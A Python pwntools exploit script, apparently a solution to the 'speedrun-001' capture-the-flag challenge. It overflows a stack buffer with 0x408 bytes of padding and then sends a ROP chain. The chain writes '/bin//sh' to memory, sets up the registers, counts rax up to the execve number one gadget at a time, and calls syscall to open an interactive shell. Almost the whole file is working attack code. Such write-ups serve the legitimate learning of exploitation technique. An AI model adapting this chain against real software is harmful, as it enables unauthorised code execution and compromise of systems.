#!/usr/bin/env python3
# -*- coding: utf-8 -*-
# This exploit template was generated via:
# $ pwn template speedrun-001
from pwn import *

# Set up pwntools for the correct architecture
exe = context.binary = ELF(args.EXE or 'speedrun-001')

# Many built-in settings can be controlled on the command-line and show up
# in "args".  For example, to dump all data sent/received, and disable ASLR
# for all created processes...
# ./exploit.py DEBUG NOASLR



def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

# Specify your GDB script here for debugging
# GDB will be launched if the exploit is run via e.g.
# ./exploit.py GDB
gdbscript = '''
tbreak *0x{exe.entry:x}
continue
'''.format(**locals())

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    No canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

# context.log_level = 'DEBUG'

io = start()
io.recvuntil("words?\n")

from struct import pack

# Padding goes here
p = b'\x00' * 0x408

# ROPgadget moment
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x0000000000415664) # pop rax ; ret
p += b'/bin//sh'
p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
p += pack('<Q', 0x000000000047f471) # mov qword ptr [rsi], rax ; ret
p += pack('<Q', 0x0000000000400686) # pop rdi ; ret
p += pack('<Q', 0x00000000006b90e0) # @ .data
p += pack('<Q', 0x00000000004101f3) # pop rsi ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x00000000004498b5) # pop rdx ; ret
p += pack('<Q', 0x00000000006b90e8) # @ .data + 8
p += pack('<Q', 0x0000000000444bc0) # xor rax, rax ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x00000000004748c0) # add rax, 1 ; ret
p += pack('<Q', 0x000000000040129c) # syscall

io.sendline(p)

io.interactive()

